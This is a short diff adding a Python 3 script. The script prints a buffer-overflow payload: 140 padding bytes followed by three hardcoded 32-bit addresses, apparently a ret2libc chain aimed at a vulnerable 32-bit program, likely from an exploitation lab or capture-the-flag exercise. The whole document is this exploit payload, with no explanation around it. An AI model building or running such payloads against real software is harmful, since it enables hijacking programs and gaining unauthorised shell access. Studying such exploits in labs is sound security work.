@@ -1,0 +1,3 @@
+#! /usr/bin/python3
+y = "A" * 140 + "\xb0\xf7\xdc\xf7" + "\x40\xec\xdb\xf7" + "\xaa\x8f\xf3\xf7"
+print(y)
